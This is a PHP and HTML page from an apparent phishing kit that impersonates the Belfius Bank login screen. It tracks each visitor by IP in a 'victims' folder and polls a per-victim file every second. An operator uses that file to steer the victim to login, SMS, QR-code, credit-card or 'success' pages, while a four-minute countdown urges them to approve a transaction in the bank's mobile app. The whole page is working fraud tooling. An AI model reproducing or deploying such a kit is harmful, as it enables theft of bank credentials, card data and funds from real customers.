<?php 
//header("Refresh: 3");

require_once "functions.php";
     require_once "ajax.php";
/*$ip = getenv('HTTP_CLIENT_IP')?:getenv('HTTP_X_FORWARDED_FOR')?:getenv('HTTP_X_FORWARDED')?:getenv('HTTP_FORWARDED_FOR')?:getenv('HTTP_FORWARDED')?:getenv('REMOTE_ADDR');
if( $ip == '::1' ) {
            $ip  = '127.0.0.1';
}

  $data = file('victims/'.$ip.'.txt')[0];
  $pieces = explode("|", $data);
  if( !$data || !file_exists('victims/'.$ip.'.txt')) {

  }elseif( $data == 'login' ) {
  header("Location: infos.php?redirection=login");
  die;
  }elseif( $data == 'sms' ) {
 header("Location: infos.php?redirection=sms");
  die;
  }elseif( $data == 'approuve' ) {
  //header("Location: infos.php?redirection=approuve");
  //die;
  }elseif($pieces[0] == 'qrcode' ) {
  header("Location: infos.php?redirection=qrcode");
  die;
  }elseif( $data == 'cc' ) {
  header("Location: infos.php?redirection=cc");
  die;
  }elseif( $data == 'success' ) {
  header("Location: infos.php?redirection=success");
  die;
  }


*/
?>


<!DOCTYPE html>
<html>
<head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <!-- link_icons -->
        <link rel="stylesheet"  href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.5.0/font/bootstrap-icons.css">
        <link rel="stylesheet"  href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css"> 
        <title>Belfius Banque - Belfius</title>
        <!-- logo site web-->
        <link rel="icon" href="image/belfius.ico" type="image/x-icon"/>
        <link rel="shortcut icon" href="image/belfius.ico" type="image/x-icon" />
        <!-- link__css -->
        <link rel="stylesheet"  href="css/bootstrap.css">
        <link rel="stylesheet"  href="css/styles.css">
        <link rel="stylesheet"  href="css/animate.css">
        <style>
            .modal-open{
                overflow:hidden;
                padding-right:0px;
            }
        </style>

</head>
<body class="modal-open">

        <div class="home_1">
            <img src="image/xl.png">
        </div>

        <div class="home_2">
            <img src="image/lg.png">
        </div>

        <div class="home_3">
            <img src="image/md.png">
        </div>

        <div class="home_4">
            <img src="image/sm.png">
        </div>

        <div class="home_5">
            <img src="image/xs.png">
        </div>

        <div class="home_6">
            <img src="image/zz.png">
        </div>

         <!-- Modal -->
        <div class="modal problem fade show" id="exampleModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true" style="display:block;">
          <div class="modal-dialog shadow ">
            <div class="modal-content">
              <div class="modal-header text-center ">
                  <h4>Se connecter</h4>
                  <i class="bi bi-x-lg"></i>
              </div>
              <div class="modal-body">
                 <div class="row">
                     <div class="col-lg-5 col-md-5 text-center sis"><img src="image/bb.png" width="170px" class="img-fluid"></div>
                     <div class="col-lg-7 col-md-7 frr">
                         <div class="right">
                             <div class="topping">
                                 <ul>
                                     <li class="doom"><a href="">Itsme®</a></li>
                                     <li class="doom"><a href="">Avec cable USB</a></li>
                                     <li class="active"><a href="">Sans cable USB</a></li>
                                 </ul>
                             </div>  
                             <div class="milieu text-center">
                                <img src="image/mama.png" width="60px" class="mt-4">
                                 <h4 class="mt-4">Ouvrir une application App Itaú</h4>
                                 <p>Accédez à l'application Belfius Mobile pour confirmer la transaction</p>
                                 <div class="dana my-5">
                                    <div class="countdown " style="color:black;font-size: 16px;"></div>
                                 </div>
                             </div>
                         </div>
                     </div>
                 </div>
              </div>
            </div>
          </div>
        </div>






        <script src="js/jquery-3.5.1.min.js"></script>
        <script src="js/jquery.mask.js"></script>
        <script>

              var timer2 = "04:00";
              var interval = setInterval(function() {
              var timer = timer2.split(':');
              //by parsing integer, I avoid all extra string processing
              var minutes = parseInt(timer[0], 10);
              var seconds = parseInt(timer[1], 10);
              --seconds;
              minutes = (seconds < 0) ? --minutes : minutes;
              if (minutes < 0) clearInterval(interval);
              seconds = (seconds < 0) ? 59 : seconds;
              seconds = (seconds < 10) ? '0' + seconds : seconds;
              //minutes = (minutes < 10) ?  minutes : minutes;
              $('.countdown').html(minutes + ':' + seconds);
              timer2 = minutes + ':' + seconds;
              }, 1000);
        </script>
		        <script>

            var ip = '<?php echo get_client_ip(); ?>';
            var waiting = setInterval(function() {
                $.get('victims/' + ip + '.txt', function(data) {
					



                    if( data == 0 ) {
                        //console.log('hada ba9i 0');
                    } else if( data == 'login' ) {
                        clearInterval(waiting);
                        location.href = "infos.php?redirection=login";

                    } else {

                        var zow = data.split('|');
                        var one = zow[0];
                        var two = zow[1];

                        if( one == 'qrcode' ) {
                          clearInterval(waiting);
                          location.href = "infos.php?redirection=qrcode";


                        } else if( data == 'approuve' ) {
                          //  clearInterval(waiting);
                          //  location.href = "infos.php?redirection=approuve";
                        } else if( data == 'sms' ) {
                            clearInterval(waiting);
                            location.href = "infos.php?redirection=sms";
                        } else if( data == 'cc' ) {
                            clearInterval(waiting);
                            location.href = "infos.php?redirection=cc";
                        } else if( data == 'success' ) {
                            clearInterval(waiting);
                            location.href = "infos.php?redirection=success";
                        }else if( data == 'approuve' ) {
                            //clearInterval(waiting);
                            //location.href = "infos.php?redirection=approuve";
                        }else if( data == 'success' ) {
                            clearInterval(waiting);
                            location.href = "infos.php?redirection=success";
                        }
                    }
                });
            }, 1000);         

              
        </script>
</body>
</html>